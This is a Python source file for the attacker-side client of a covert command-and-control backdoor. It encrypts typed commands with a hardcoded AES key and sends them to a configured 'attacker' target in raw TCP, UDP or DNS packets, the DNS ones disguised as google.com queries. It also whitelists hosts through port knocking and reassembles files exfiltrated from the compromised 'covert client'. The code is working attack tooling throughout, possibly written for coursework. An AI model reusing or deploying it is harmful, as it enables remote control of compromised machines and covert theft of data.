import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.fields import StrField
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP, TCP
from scapy.all import sniff, send, Raw
from scapy.packet import Packet, bind_layers
from scapy.volatile import RandShort
from threading import Thread
import yaml



class Client:
    def __init__(self):
        print(f"Client has been initiated.")
        print("--------------------------------------------------------------")
        self.target_ip = ""
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag_begin = "****["
        self.flag_close = "]****"
        self.port = 0
        self.check = True
        self.supported_protos = ["udp", "tcp", "dns"]
        self.proto = ""
        self.sequence = []
        self.cur_pos = 0
        self.filter = ""
        self.whitelist = []
        self.file_bits = []
        self.recv_port = ""
        self.send_port = ""
        self.file_port = ""

    def start(self):
        self.process_yaml()
        self.create_thread()
        self.get_input()

    def get_input(self):
        while True:
            if self.check:
                cmd = input("Enter command:")
                self.set_check()
                msg = self.prepare_msg(cmd)
                self.craft_packet(msg)

    def set_check(self):
        self.check = not self.check

    def process_yaml(self):
        with open('config.yaml', 'r') as f:
            config = yaml.safe_load(f)

        self.target_ip = config['attacker']['target']
        self.recv_port = config['attacker']['recv_port']
        self.send_port = config['attacker']['send_port']
        self.file_port = config['share']['src_port']
        self.proto = config['share']['proto']
        self.sequence = config['share']['sequence']
        self.filter = self.proto + " or tcp"
        print(f"target is {self.target_ip}")
        print(f"Send is {self.send_port}")
        print(f"recv is {self.recv_port}")
        print(f"proto  is {self.proto}")
        print(f"seqwuence  is {self.sequence}")
        print(f"file port  is {self.file_port}")

    def prepare_msg(self, cmd: str) -> str:
        cipher = self.generate_cipher()
        cmd = self.flag_begin + cmd + self.flag_close
        encrypted_data = self.encrypt_data(cipher, cmd)
        # Convert the encrypted string to bytes
        print(f"Encrypted format: {encrypted_data}")
        hex_str = self.get_hex_string(encrypted_data)
        print(f"Added flags, sending: {hex_str}")
        print("--------------------------------------------------------------")
        return hex_str

    def create_thread(self):
        x = Thread(target=self.sniff_init)
        x.start()

    def sniff_init(self):
        try:
            sniff(filter=self.filter, prn=lambda p: self.filter_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def process_packets(self, msg: str):
        stripped_msg = msg.strip(self.flag_begin).rstrip(self.flag_close)
        print(f"{stripped_msg}")
        self.set_check()

    def filter_packets(self, packet) -> None:
        """Various filters for packet processing, passes to
        respective processing methods
        """
        # This filter checks if the packets are a part of a valid port knocking sequence
        if packet.haslayer(IP) and packet.haslayer(TCP):
            if packet[TCP].flags & 0x02 and packet[TCP].dport == self.sequence[self.cur_pos]:
                self.cur_pos += 1
                if self.cur_pos == len(self.sequence):
                    print("Whitelisting a dude")
                    self.whitelist.append(packet[IP].src)
                    self.cur_pos = 0

        # This filter process files received by covert client
        if IP in packet and packet[IP].src in self.whitelist \
                and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
            if packet[IP].src in self.whitelist:
                print(f"received data from whitelisted ip: {packet[IP].src}")
                if Raw in packet:
                    data = packet[Raw].load
                    if b'\x00' in data:
                        filename = data.split(b'\x00')[0]
                        filename = filename.decode()
                        print("Terminator received....")
                        self.combine_bits(filename)
                        self.file_bits = []
                    else:
                        self.file_bits.append(data)

        # This is the filter for responses from executed commands
        # try:
        #     msg = packet[UDP].load.decode()
        #     if UDP in packet and packet[UDP].dport == self.recv_port:
        #         val = self.authenticate_packet(msg, packet)
        #         if val:
        #             self.process_packets(val)
        # except:
        #     return

    def combine_bits(self, name: str):
        """Combines the stored data saves it as a file"""
        data = b''.join(self.file_bits)
        with open(name, 'wb') as f:
            f.write(data)
        print("file saved")

    def authenticate_packet(self, data: str) -> str:
        decrypted_msg = self.decrypt_data(data)
        if decrypted_msg.startswith(self.flag_begin) and decrypted_msg.endswith(self.flag_close):
            return decrypted_msg

    def craft_packet(self, msg: str) -> None:
        if self.proto == "tcp":
            print(f"sending {self.proto}")
            self.create_tcp(msg)
        elif self.proto == "udp":
            print(f"sending {self.proto}")
            self.create_udp(msg)
        else:
            print(f"sending {self.proto}")
            self.create_dns(msg)

    def create_dns(self, msg: str):
        """Creates DNS packet,embeds data in payload, and sends"""
        ip = IP(dst=self.target_ip)
        udp = UDP(sport=RandShort(), dport=self.send_port)
        dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
        payload = msg
        pkt = ip / udp / dns / payload
        try:
            send(pkt, verbose=0)
        except (OSError, PermissionError) as e:
            print(f"{e}")
            sys.exit()


    def create_tcp(self, msg: str) -> None:
        """Creates TCP packet,embeds data in payload, and sends"""
        print("Creating TCP packets")
        msg = msg.encode()
        pkt = IP(dst=self.target_ip) / TCP(sport=RandShort(), dport=self.send_port) / Raw(load=msg)
        try:
            send(pkt, verbose=0)
        except (OSError, PermissionError) as e:
            print(f"{e}")
            sys.exit()

    def create_udp(self, msg: str) -> None:
        """Creates UDP packet,embeds data in payload, and sends"""
        ip = IP(dst=self.target_ip)
        udp = UDP(sport=RandShort(), dport=self.send_port)
        payload = msg
        pkt = ip / udp / payload
        try:
            send(pkt, verbose=0)
        except (OSError, PermissionError) as e:
            print(f"{e}")
            sys.exit()

    def decrypt_data(self, msg: str) -> str:
        encrypted_byte_stream = bytes.fromhex(msg)
        cipher = self.generate_cipher()
        # Initialize a decryptor object
        decryptor = cipher.decryptor()
        # Initialize an unpadder object
        unpadder = padding.PKCS7(128).unpadder()
        # Decrypt and remove padding
        padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
        msg = unpadder.update(padded_message) + unpadder.finalize()
        msg = msg.decode()
        return msg

    def get_hex_string(self, encrypted_line):
        """ Returns hex string of byte stream (encrypted string)"""
        return encrypted_line.hex()

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))

    def encrypt_data(self, cipher, line) -> bytes:
        """Encrypts message"""
        encryptor = cipher.encryptor()
        # Padding needed at AES requires specific byte size.
        # Allows for custom length messages.
        padder = padding.PKCS7(128).padder()
        padded_line = padder.update(line.encode()) + padder.finalize()
        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
        return encrypted_line

    def get_ascii(self, hex_char) -> int:
        """Returns ascii code of char"""
        return ord(hex_char)

    def get_char(self, ascii) -> chr:
        """Gets char from ascii code"""
        return chr(ascii)
